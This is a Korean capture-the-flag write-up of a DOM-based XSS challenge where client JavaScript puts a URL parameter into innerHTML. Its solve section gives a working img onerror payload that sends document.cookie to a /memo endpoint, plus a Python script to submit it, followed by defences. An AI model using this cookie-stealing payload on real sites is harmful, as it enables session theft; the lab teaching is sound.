## dom_xss_memo_leak

> 문제 설명: 이전 `xss_memo_leak` 문제와 전체 구조(bot이 `flag=FLAG` 쿠키를 들고 `/vuln?param=...`을 방문, `/memo` 전역 변수로 데이터 유출)는 동일하지만, `/vuln`이 더 이상 입력값을 서버에서 그대로 반환하지 않고 **고정된 템플릿**만 반환합니다. 대신 템플릿 내 JavaScript가 `param` 값을 `innerHTML`에 삽입하는 **DOM-based XSS** 문제입니다.

### **취약점: DOM-based XSS (`innerHTML` 삽입)**

```python
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")   # 서버는 고정 HTML만 반환, param reflect 없음
```

```html
<!-- vuln.html -->
<div id="vuln"></div>
<script>
  var x = new URLSearchParams(location.search);
  document.getElementById("vuln").innerHTML = x.get("param"); // ← 클라이언트에서 검증 없이 삽입
</script>
```

서버는 입력값을 전혀 반영하지 않지만, **클라이언트 JS가 URL의 `param` 쿼리값을 읽어 `innerHTML`에 그대로 삽입**하기 때문에 취약점이 서버가 아닌 브라우저 단에서 발생합니다.

`/flag`에 제출한 `param`을 가지고 bot이 **FLAG 쿠키를 보유한 채** `/vuln?param=...`을 방문하는 구조는 이전 문제와 동일합니다.

```python
check_xss(param, {"name": "flag", "value": FLAG.strip()})
```

```python
driver.add_cookie(cookie)   # flag=FLAG 쿠키 주입
driver.get(url)             # 쿠키 보유 상태로 /vuln?param=... 방문
```

외부 webhook이 없으므로, 이전과 동일하게 **같은 서버의 `/memo` 전역 변수**를 탈취 통로로 사용합니다.

```python
memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    memo_text += request.args.get("memo", "") + "\n"
    return render_template("memo.html", memo=memo_text)
```

### 핵심 차이점: `<script>` 태그가 안 통하는 이유

`innerHTML`로 삽입된 `<script>` 태그는 브라우저 보안 정책상 **실행되지 않습니다**. 대신 DOM에 삽입되는 즉시 자동 실행되는 **이벤트 핸들러(`onerror`, `onload` 등)**를 가진 태그를 사용해야 합니다.

### Solve 😈

**`/flag`의 `param` payload**

```html
<img
  src="x"
  onerror="document.location='http://127.0.0.1:8000/memo?memo='+document.cookie"
/>
```

```python
import requests

base = "http://host:port"
payload = "<img src=x onerror=\"document.location='http://127.0.0.1:8000/memo?memo='+document.cookie\">"

# 1. bot이 flag 쿠키를 들고 /vuln?param=... 방문 -> innerHTML 삽입 -> onerror 실행 -> /memo로 쿠키 유출
requests.post(f"{base}/flag", data={"param": payload})

# 2. /memo에서 유출된 쿠키(FLAG 포함) 확인
r = requests.get(f"{base}/memo")
print(r.text)
```

**결과:** `memo_text`에 `flag=DH{...}` 형태로 FLAG 쿠키 값이 기록됨

### 근본 원인 및 방어법

- **원인**:
  - 클라이언트 JS가 사용자 제어 가능한 값(`location.search`)을 검증 없이 `innerHTML`에 삽입 (DOM-based XSS)
  - 민감한 값을 쿠키로 저장한 bot이 공격자 제어 하의 페이지를 방문
  - 같은 애플리케이션 내 공개 쓰기/읽기 가능한 엔드포인트(`/memo`)가 데이터 유출 경로로 악용됨
- **방어법**
  - `innerHTML` 대신 `textContent`/`innerText` 사용, 또는 삽입 전 반드시 이스케이프 처리
  - 민감한 쿠키에 `HttpOnly` 속성 부여 → `document.cookie` 접근 자체 차단
  - CSP(Content-Security-Policy) 적용으로 인라인 이벤트 핸들러 및 임의 리다이렉트 차단
  - 전역 상태를 아무나 쓰고 읽을 수 있는 엔드포인트(`/memo`) 설계 지양
